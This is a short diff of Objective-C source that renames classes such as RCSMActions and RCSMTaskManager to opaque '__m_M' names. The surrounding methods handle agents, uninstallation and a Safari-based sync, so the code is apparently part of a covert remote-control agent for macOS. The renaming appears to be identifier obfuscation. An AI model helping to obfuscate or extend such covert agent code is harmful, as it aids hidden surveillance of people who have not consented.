@@ -21,7 +21,7 @@
 #import "RCSMDebug.h"
 
 
-@implementation RCSMActions
+@implementation __m_MActions
 
 - (id)init
 {
@@ -195,7 +195,7 @@
   
   if (_syncThroughSafariWentOk == NO)
     {
-      /*RCSMCommunicationManager *communicationManager = [[RCSMCommunicationManager alloc]
+      /*__m_MCommunicationManager *communicationManager = [[__m_MCommunicationManager alloc]
                                                         initWithConfiguration: syncConfig];
       
       if ([communicationManager performSync] == FALSE)
@@ -250,7 +250,7 @@
 
 - (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
 {
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   [aConfiguration retain];
   
@@ -341,7 +341,7 @@
 - (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   [aConfiguration retain];
   
@@ -362,7 +362,7 @@
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+  __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
   
   [aConfiguration retain];
 
@@ -402,7 +402,7 @@ typedef struct {
   if (event != nil)
     {
       NSMutableDictionary *anEvent = 
-                          [[[RCSMTaskManager sharedInstance] mEventsList] objectAtIndex: event->event];
+                          [[[__m_MTaskManager sharedInstance] mEventsList] objectAtIndex: event->event];
       
       @synchronized(anEvent)
       {  
